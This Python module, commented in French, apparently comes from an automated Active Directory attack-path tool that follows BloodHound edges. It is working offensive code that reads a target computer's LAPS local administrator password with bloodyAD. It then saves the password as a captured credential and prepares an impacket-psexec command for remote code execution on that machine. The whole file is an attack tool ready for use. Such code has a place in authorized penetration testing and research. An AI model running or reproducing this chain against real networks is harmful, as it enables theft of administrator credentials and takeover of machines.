import subprocess
from dataclasses import dataclass

from .exploit_strategy import ExploitStrategy
from entities.edge import Edge
from entities.node import Node
from entities.exploit_result import ExploitResult
from entities.edge_kind import EdgeKind
from entities.credentials import Credential
from exceptions.hop_failed_error import HopFailedError
from services.printing import print_check, print_done
from references.cred_store import enrich_creds


@dataclass
class ReadLAPSStrategy(ExploitStrategy):
    """
    ReadLAPSPassword — Le compte source a le droit de lire ms-Mcs-AdmPwd
    sur la machine cible.
    Outil : bloodyAD

    Direction BloodHound : User --ReadLAPSPassword--> Machine
        edge.source_node = compte avec droit de lecture LAPS
        edge.goal_node   = machine dont on lit le mot de passe admin local
    """

    edge: Edge

    @property
    def attacker(self) -> Node:
        return self.edge.source_node  # compte avec droit ReadLAPSPassword

    @property
    def target(self) -> Node:
        return self.edge.goal_node  # machine dont on lit le LAPS

    # ── Interface ExploitStrategy ─────────────────────────────────────────────

    def can_exploit(self) -> bool:
        return self.edge.kind == EdgeKind.READ_LAPS_PASSWORD

    def exploit(self, creds: dict) -> ExploitResult:
        creds = {**creds, "username": self.attacker.sam()}
        creds = enrich_creds(creds)
        print_check(
            f"ReadLAPS: {self.attacker.label} ──▶ lecture LAPS sur {self.target.label}"
        )
        return self._run_bloodyad(creds)

    # ── Technique ─────────────────────────────────────────────────────────────

    def _run_bloodyad(self, creds: dict) -> ExploitResult:
        dc_ip    = creds["dc_ip"]
        domain   = creds["domain"]
        username = creds["username"]
        secret   = creds.get("secret", "")

        computer_fqdn  = self.target.label
        computer_short = computer_fqdn.split(".")[0]

        laps_password = None
        last_output   = ""

        # Tente d'abord le FQDN, puis le nom court en fallback
        for computer in [computer_fqdn, computer_short]:
            cmd = [
                "bloodyAD",
                "--host", dc_ip,
                "-d",    domain,
                "-u",    username,
                "-p",    secret,
                "get", "object", computer,
                "--attr", "ms-Mcs-AdmPwd",
            ]
            try:
                proc = subprocess.run(cmd, capture_output=True, text=True, timeout=15)
                last_output = proc.stdout + proc.stderr
            except subprocess.TimeoutExpired:
                raise HopFailedError(self.edge, f"bloodyAD timeout (15s) sur {computer}")
            except FileNotFoundError:
                raise HopFailedError(
                    self.edge,
                    "bloodyAD introuvable dans le PATH — pip install bloodyAD"
                )

            for line in last_output.splitlines():
                if "ms-Mcs-AdmPwd" in line and ":" in line:
                    laps_password = line.split(":", 1)[1].strip()
                    break

            if laps_password:
                break  # succès, inutile d'essayer le nom court

        if not laps_password:
            raise HopFailedError(
                self.edge,
                f"bloodyAD ran but ms-Mcs-AdmPwd non trouvé — output:\n{last_output}"
            )

        print_done(
            f"ReadLAPS OK — Administrator LAPS password récupéré sur {computer_fqdn}"
        )

        return ExploitResult(
            technique="ReadLAPSPassword (bloodyAD get object --attr ms-Mcs-AdmPwd)",
            edge=self.edge,
            success=True,
            notes=(
                f"LAPS lu sur {computer_fqdn} par {self.attacker.label}\n"
                f"  Administrator password : {laps_password}"
            ),
            next_command=(
                f"impacket-psexec {domain}/Administrator:'{laps_password}'@{computer_fqdn} "
                f"-target-ip {dc_ip}"
            ),
            cleanup_command=(
                "# LAPS renouvellera le mot de passe automatiquement à la prochaine échéance"
            ),
            gained_access=Credential(
                username="Administrator",
                password=laps_password,
                domain=creds.get("domain"),
                dc_ip=creds.get("dc_ip"),
            ),
        )